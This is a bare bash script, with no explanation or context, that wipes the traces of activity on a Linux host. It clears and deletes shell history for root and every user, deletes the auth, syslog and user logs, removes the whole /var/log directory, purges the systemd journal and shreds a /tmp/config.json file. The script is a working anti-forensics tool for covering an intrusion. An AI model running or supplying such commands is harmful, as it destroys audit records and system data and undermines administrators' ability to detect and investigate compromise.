#!/bin/bash

history -c
history -w
unset HISTFILE

> ~/.bash_history
rm -f ~/.bash_history
> /root/.bash_history
rm -f /root/.bash_history

for user_dir in /home/*; do
    if [ -d "$user_dir" ]; then
        > "$user_dir/.bash_history"
        rm -f "$user_dir/.bash_history"
    fi
done

rm -f ~/.zsh_history
rm -f ~/.ash_history
rm -f ~/.csh_history
rm -f ~/.ksh_history
rm -f ~/.tcsh_history

find /var/log -type f -name "auth.log" -delete
find /var/log -type f -name "syslog" -delete
find /var/log -type f -name "user.log" -delete

rm -rf /var/log
journalctl --vacuum-time=1s

shred -u /var/log/*
shred -u /tmp/config.json

clear

